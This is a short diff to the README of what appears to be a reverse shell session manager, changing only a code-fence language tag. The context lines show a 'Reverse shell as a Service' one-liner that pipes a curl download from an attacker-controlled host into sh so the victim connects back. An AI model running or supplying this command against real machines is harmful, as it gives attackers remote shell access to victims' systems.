@@ -20,7 +20,7 @@ A modern multiple reverse shell sessions/clients manager via terminal written in
 ```
 
 #### Reverse shell as a Service
-```
+```bash
 # victim will be redirected to attacker-host attacker-port
 sh -c "$(curl http://host:port/attacker-host/attacker-port)"
 # if the attacker info not specified, it will use host, port as attacker-host attacker-port
